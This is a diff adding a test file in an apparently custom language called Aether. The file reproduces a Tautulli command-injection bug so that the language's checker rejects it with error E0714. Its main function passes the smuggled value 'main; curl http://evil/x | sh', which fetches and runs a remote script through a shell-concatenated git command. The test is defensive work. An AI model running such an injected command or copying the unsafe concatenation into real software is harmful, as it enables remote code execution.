@@ -1,0 +1,27 @@
+// CVE-2025-58763 — Tautulli authenticated RCE via command injection
+// (GHSA-jrm9-r57q-6cvf). A user-controlled value flows into a git
+// invocation run through the shell, so shell metacharacters execute
+// attacker commands.
+//
+// The command is built by raw concatenation of untrusted input. Aether
+// refuses it: [E0714].
+//
+// Run:  aether check cve_2025_58763_tautulli_cmd_vulnerable.aeth -> E0714
+
+module Updater
+  requires capability exec
+  exports runGit
+end
+
+function runGit(branch: String) returns String
+  effects exec.run
+do
+  // subprocess with shell=True on a concatenated command line.
+  return shellExec("git checkout " + branch)
+end
+
+function main() returns Unit
+  effects exec.run
+do
+  let _r: String = runGit("main; curl http://evil/x | sh")
+end
